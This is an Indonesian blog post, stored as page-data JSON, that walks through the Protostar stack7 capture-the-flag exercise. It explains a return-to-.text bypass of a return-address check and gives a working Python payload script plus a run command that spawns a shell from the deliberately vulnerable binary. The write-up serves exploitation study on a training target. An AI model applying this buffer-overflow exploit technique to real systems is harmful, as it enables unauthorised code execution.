{"componentChunkName":"component---src-templates-blog-post-js","path":"/belajar-reversing-protostar-stack7/","result":{"data":{"markdownRemark":{"html":"<p>Sekarang kita telah sampai pada challenge terakhir protostar bertajuk stack, stack7. Seperti biasa kita akan coba periksa stack7 dengan utilitas <code class=\"language-text\">file</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token function\">file</span> stack7</code></pre></div>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 653px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/9c529d295cf2cac8a29fee0b759d3182/e7dce/protostar-stack7-1.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 13%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAADCAIAAAAcOLh5AAAACXBIWXMAAAsSAAALEgHS3X78AAAAj0lEQVQI1z2NWQrDMAwFc5pCaeuUbM5ieZElLyHQ5f6HqchH4SGGkcRrfMqOeQ1oiYSxlJCy52SJJwP9sqlhunfDP49+FNOO+nJTjcHoOJ8zAUaIDJFWj45YTMhlCyhmtk5gcX7xQViDGzfT0H5gqWdnpVqx7PJzfL719Za13E3GziBxwgZJG1CD7ub1qp4/f24rjMeiHfQAAAAASUVORK5CYII='); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"output file stack7\"\n        title=\"output file stack7\"\n        src=\"/static/9c529d295cf2cac8a29fee0b759d3182/e7dce/protostar-stack7-1.png\"\n        srcset=\"/static/9c529d295cf2cac8a29fee0b759d3182/772e8/protostar-stack7-1.png 200w,\n/static/9c529d295cf2cac8a29fee0b759d3182/e17e5/protostar-stack7-1.png 400w,\n/static/9c529d295cf2cac8a29fee0b759d3182/e7dce/protostar-stack7-1.png 653w\"\n        sizes=\"(max-width: 653px) 100vw, 653px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Sepertinya tidak ada yang perlu diperhatikan, sekarang mari kita lihat source codenya.</p>\n<div class=\"gatsby-highlight\" data-language=\"c\"><pre class=\"language-c\"><code class=\"language-c\"><span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdlib.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;unistd.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;stdio.h></span></span>\n<span class=\"token macro property\">#<span class=\"token directive keyword\">include</span> <span class=\"token string\">&lt;string.h></span></span>\n\n<span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token function\">getpath</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token keyword\">char</span> buffer<span class=\"token punctuation\">[</span><span class=\"token number\">64</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">unsigned</span> <span class=\"token keyword\">int</span> ret<span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"input path please: \"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token function\">fflush</span><span class=\"token punctuation\">(</span><span class=\"token constant\">stdout</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token function\">gets</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  ret <span class=\"token operator\">=</span> <span class=\"token function\">__builtin_return_address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>ret <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xb0000000</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0xb0000000</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n      <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"bzzzt (%p)\\n\"</span><span class=\"token punctuation\">,</span> ret<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n      <span class=\"token function\">_exit</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">}</span>\n\n  <span class=\"token function\">printf</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"got path %s\\n\"</span><span class=\"token punctuation\">,</span> buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">return</span> <span class=\"token function\">strdup</span><span class=\"token punctuation\">(</span>buffer<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">int</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span> argc<span class=\"token punctuation\">,</span> <span class=\"token keyword\">char</span> <span class=\"token operator\">*</span><span class=\"token operator\">*</span>argv<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">{</span>\n  <span class=\"token function\">getpath</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span></code></pre></div>\n<p>Dibandingkan dengan <a href=\"/belajar-reversing-protostar-stack6\">stack6</a> kemarin perbedaan terletak pada pengecekan. Kali ini pengecekan return address lebih ketat, kita tidak boleh return ke address 0xbxxxxxxx. Jadi sudah pasti kita tidak bisa return ke stack dan jika kalian perhatikan kembali pada <a href=\"/belajar-reversing-protostar-stack6\">stack6</a> kemarin address fungsi system memenuhi kondisi 0xbxxxxxxx yang berarti kita tidak bisa melakukan ret2libc!\nMenengok ke <a href=\"http://exploit.education/protostar/stack-seven/\">halaman resmi stack7</a>, untuk menyelesaikan challenge ini kita bisa menggunakan <a href=\"https://halcyonic.net/2019-09-30-return-to-text/\"><strong>return to .text</strong></a>. Jika dalam ret2libc kita mereturn ke libc yang diload, ret2.text berarti kita mereturn ke segment .text. Dalam komputasi, segmen kode, juga dikenal sebagai segmen teks atau hanya sebagai teks, adalah bagian dari file objek atau bagian yang sesuai dari ruang alamat virtual program yang berisi instruksi yang dapat dieksekusi -<a href=\"https://en.wikipedia.org/wiki/Code_segment\">wikipedia</a>.</p>\n<p>Segment .text dari stack7 dapat kita lihat dengan bantuan <code class=\"language-text\">objdump</code>.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">objdump -d .j .text stack7</code></pre></div>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 644px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/578d1bd2f3b426517d445d483ba4911a/78274/protostar-stack7-2.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 68%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"output command diatas\"\n        title=\"output command diatas\"\n        src=\"/static/578d1bd2f3b426517d445d483ba4911a/78274/protostar-stack7-2.png\"\n        srcset=\"/static/578d1bd2f3b426517d445d483ba4911a/772e8/protostar-stack7-2.png 200w,\n/static/578d1bd2f3b426517d445d483ba4911a/e17e5/protostar-stack7-2.png 400w,\n/static/578d1bd2f3b426517d445d483ba4911a/78274/protostar-stack7-2.png 644w\"\n        sizes=\"(max-width: 644px) 100vw, 644px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Dapat kalian lihat pada gambar diatas, segment .text berisikan entry point dan jika kalian scroll kebawah kalian dapat melihat hasil disassembly fungsi <strong>main</strong> dan <strong>getpath</strong>. Jika kalian ingin melihat daftar segment yang terdapat dalam executable stack7 kalian dapat memenfaatkan opsi <strong>-h</strong> dari objdump <code class=\"language-text\">objdump -h stack7</code> atau bisa juga dengan menggunakan gdb, gunakan <code class=\"language-text\">info file</code> jika kalian sudah meload executable stack7 pada gdb.</p>\n<p>Sekarang bagaimana kita akan memanfaatkan segment .text untuk mendapatkan akses shell? Dengan adanya pengecekan kita tidak bisa mereturn ke stack atau libc. Namun jika kalian cermati address dari segment .text berkisar antara <strong>0x08048410 - 0x080485fc</strong> sehingga kita bisa mereturn ke instruksi yang ada disini. Pengecekan hanya terdapat pada fungsi getpath, jadi setelah keluar dari getpath kita bisa mereturn ke address manapun. Perhatikan ilustrasi payload dari <a href=\"/belajar-reversing-protostar-stack6\">stack6</a> berikut.</p>\n<p><span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 259px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/207a59bc75fdcd92a1ab4bb26261dcc5/a2ead/protostar-stack6-10.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 81%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"ilustrasi payload stack6\"\n        title=\"ilustrasi payload stack6\"\n        src=\"/static/207a59bc75fdcd92a1ab4bb26261dcc5/a2ead/protostar-stack6-10.png\"\n        srcset=\"/static/207a59bc75fdcd92a1ab4bb26261dcc5/772e8/protostar-stack6-10.png 200w,\n/static/207a59bc75fdcd92a1ab4bb26261dcc5/a2ead/protostar-stack6-10.png 259w\"\n        sizes=\"(max-width: 259px) 100vw, 259px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Pada stack6 kita berhasil memanggil fungsi system lalu keluar executable dengan fungsi exit. Pada stack7 ini kita bisa memanggil fungsi perantara lalu keluar menuju fungsi system. Cukup menggeser payload kita 4 byte lalu menyisipkan address fungsi perantara sebelum address system. Berikut ilustrasi payload yang akan kita gunakan pada stack7.\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 243px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/3433c34fcabe652c876c3f12c033304d/8aea6/protostar-stack7-3.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 83%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"ilustrasi payload stack7\"\n        title=\"ilustrasi payload stack7\"\n        src=\"/static/3433c34fcabe652c876c3f12c033304d/8aea6/protostar-stack7-3.png\"\n        srcset=\"/static/3433c34fcabe652c876c3f12c033304d/772e8/protostar-stack7-3.png 200w,\n/static/3433c34fcabe652c876c3f12c033304d/8aea6/protostar-stack7-3.png 243w\"\n        sizes=\"(max-width: 243px) 100vw, 243px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Sekarang kita akan mencari perantara.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\">objdump -d -j .text stack7\nobjdump -d -j .text -M intel stack7 <span class=\"token comment\">#jika lebih suka hasil disassembly dalam format intel</span></code></pre></div>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 695px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/4001137d538627590170442595c26cfd/83b75/protostar-stack7-4.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 59.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"output perintah diatas\"\n        title=\"output perintah diatas\"\n        src=\"/static/4001137d538627590170442595c26cfd/83b75/protostar-stack7-4.png\"\n        srcset=\"/static/4001137d538627590170442595c26cfd/772e8/protostar-stack7-4.png 200w,\n/static/4001137d538627590170442595c26cfd/e17e5/protostar-stack7-4.png 400w,\n/static/4001137d538627590170442595c26cfd/83b75/protostar-stack7-4.png 695w\"\n        sizes=\"(max-width: 695px) 100vw, 695px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Beruntung sekali fungsi terakhir yang ditampilkan sepertinya dapat kita gunakan.</p>\n<div class=\"gatsby-highlight\" data-language=\"nasm\"><pre class=\"language-nasm\"><code class=\"language-nasm\">080485d0 <span class=\"token operator\">&lt;</span>__do_<span class=\"token keyword\">global_ctors_aux>:</span>\n 80485d0:\t<span class=\"token number\">55</span>                   \tpush   <span class=\"token register variable\">ebp</span>\n 80485d1:\t<span class=\"token number\">89</span> e5                \tmov    <span class=\"token register variable\">ebp</span>,<span class=\"token register variable\">esp</span>\n 80485d3:\t<span class=\"token number\">53</span>                   \tpush   <span class=\"token register variable\">ebx</span>\n 80485d4:\t<span class=\"token number\">83</span> ec <span class=\"token number\">04</span>             \tsub    <span class=\"token register variable\">esp</span>,<span class=\"token number\">0x4</span>\n 80485d7:\ta1 <span class=\"token number\">54</span> <span class=\"token number\">96</span> <span class=\"token number\">04</span> <span class=\"token number\">08</span>       \tmov    <span class=\"token register variable\">eax</span>,<span class=\"token register variable\">ds</span>:<span class=\"token number\">0x8049654</span>\n 80485dc:\t<span class=\"token number\">83</span> f8 ff             \tcmp    <span class=\"token register variable\">eax</span>,<span class=\"token number\">0xffffffff</span>\n 80485df:\t<span class=\"token number\">74</span> <span class=\"token number\">13</span>                \tje     80485f4 <span class=\"token operator\">&lt;</span>__do_<span class=\"token keyword\">global_ctors_aux+0x24></span>\n <span class=\"token number\">80485e1</span>:\tbb <span class=\"token number\">54</span> <span class=\"token number\">96</span> <span class=\"token number\">04</span> <span class=\"token number\">08</span>       \tmov    <span class=\"token register variable\">ebx</span>,<span class=\"token number\">0x8049654</span>\n <span class=\"token number\">80485e6</span>:\t<span class=\"token number\">66</span> <span class=\"token number\">90</span>                \txchg   <span class=\"token register variable\">ax</span>,<span class=\"token register variable\">ax</span>\n <span class=\"token number\">80485e8</span>:\t<span class=\"token number\">83</span> eb <span class=\"token number\">04</span>             \tsub    <span class=\"token register variable\">ebx</span>,<span class=\"token number\">0x4</span>\n 80485eb:\tff d0                \tcall   <span class=\"token register variable\">eax</span>\n 80485ed:\t8b <span class=\"token number\">03</span>                \tmov    <span class=\"token register variable\">eax</span>,DWORD PTR <span class=\"token operator\">[</span><span class=\"token register variable\">ebx</span><span class=\"token operator\">]</span>\n 80485ef:\t<span class=\"token number\">83</span> f8 ff             \tcmp    <span class=\"token register variable\">eax</span>,<span class=\"token number\">0xffffffff</span>\n 80485f2:\t<span class=\"token number\">75</span> f4                \tjne    <span class=\"token number\">80485e8</span> <span class=\"token operator\">&lt;</span>__do_<span class=\"token keyword\">global_ctors_aux+0x18></span>\n 80485f4:\t<span class=\"token number\">83</span> c4 <span class=\"token number\">04</span>             \tadd    <span class=\"token register variable\">esp</span>,<span class=\"token number\">0x4</span>\n 80485f7:\t5b                   \tpop    <span class=\"token register variable\">ebx</span>\n 80485f8:\t<span class=\"token number\">5d</span>                   \tpop    <span class=\"token register variable\">ebp</span>\n 80485f9:\tc3                   \tret\n 80485fa:\t<span class=\"token number\">90</span>                   \tnop\n 80485fb:\t<span class=\"token number\">90</span>                   \tnop</code></pre></div>\n<p>Kita tidak perlu mereturn ke keseluruhan fungsi diatas, cukup pada bagian instruksi <strong>ret</strong> saja sehingga tidak mengacaukan stack yang telah kita manipulasi. Salin address instruksi ret, sisipkan pada payload yang kita gunakan pada <a href=\"/belajar-reversing-protostar-stack7.png\">stack6</a>. Kita tidak perlu mencari offset karena ukuran buffernya sama dengan stack6, begitu juga dengan address system, address exit, string '/bin/sh' pada libc.</p>\n<div class=\"gatsby-highlight\" data-language=\"python\"><pre class=\"language-python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> struct\n\noffset<span class=\"token operator\">=</span><span class=\"token number\">80</span><span class=\"token operator\">*</span><span class=\"token string\">\"A\"</span> <span class=\"token comment\">#padding</span>\nperantara<span class=\"token operator\">=</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;I\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x80485f9</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#(eip) return ke instruksi ret</span>\nsystem<span class=\"token operator\">=</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;I\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb7ecffb0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#return ke system setelah instruksi ret selesai</span>\nexit<span class=\"token operator\">=</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;I\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb7ec60c0</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#keluar dari executable</span>\nargs<span class=\"token operator\">=</span>struct<span class=\"token punctuation\">.</span>pack<span class=\"token punctuation\">(</span><span class=\"token string\">\"&lt;I\"</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0xb7e97000</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x11f3bf</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#argumen untuk system</span>\n<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>offset<span class=\"token operator\">+</span>perantara<span class=\"token operator\">+</span>system<span class=\"token operator\">+</span>exit<span class=\"token operator\">+</span>args<span class=\"token punctuation\">)</span></code></pre></div>\n<p>Diatas merupakan script python yang akan menghasilkan payload untuk kita. Simpan dengan nama payload.py pada directory /tmp. Lalu kita jalankan stack7 dengan input payload kita.</p>\n<div class=\"gatsby-highlight\" data-language=\"bash\"><pre class=\"language-bash\"><code class=\"language-bash\"><span class=\"token punctuation\">(</span>python /tmp/payload.py<span class=\"token punctuation\">;</span> <span class=\"token function\">cat</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">|</span> ./stack7</code></pre></div>\n<p>output:\n<span\n      class=\"gatsby-resp-image-wrapper\"\n      style=\"position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 643px; \"\n    >\n      <a\n    class=\"gatsby-resp-image-link\"\n    href=\"/static/aee24232ef3327a7adab88a1cdaeeed8/b5bda/protostar-stack7-5.png\"\n    style=\"display: block\"\n    target=\"_blank\"\n    rel=\"noopener\"\n  >\n    <span\n    class=\"gatsby-resp-image-background-image\"\n    style=\"padding-bottom: 20.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,'); background-size: cover; display: block;\"\n  ></span>\n  <img\n        class=\"gatsby-resp-image-image\"\n        alt=\"menjalankan stack7 dengan payload\"\n        title=\"menjalankan stack7 dengan payload\"\n        src=\"/static/aee24232ef3327a7adab88a1cdaeeed8/b5bda/protostar-stack7-5.png\"\n        srcset=\"/static/aee24232ef3327a7adab88a1cdaeeed8/772e8/protostar-stack7-5.png 200w,\n/static/aee24232ef3327a7adab88a1cdaeeed8/e17e5/protostar-stack7-5.png 400w,\n/static/aee24232ef3327a7adab88a1cdaeeed8/b5bda/protostar-stack7-5.png 643w\"\n        sizes=\"(max-width: 643px) 100vw, 643px\"\n        style=\"width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;\"\n        loading=\"lazy\"\n      />\n  </a>\n    </span></p>\n<p>Berhasil! Selain menggunakan fungsi system, disini kita juga bisa menggunakan shellcode, selamat mencoba.</p>","frontmatter":{"title":"Protostar: stack7"}}},"pageContext":{"slug":"/belajar-reversing-protostar-stack7/"}}}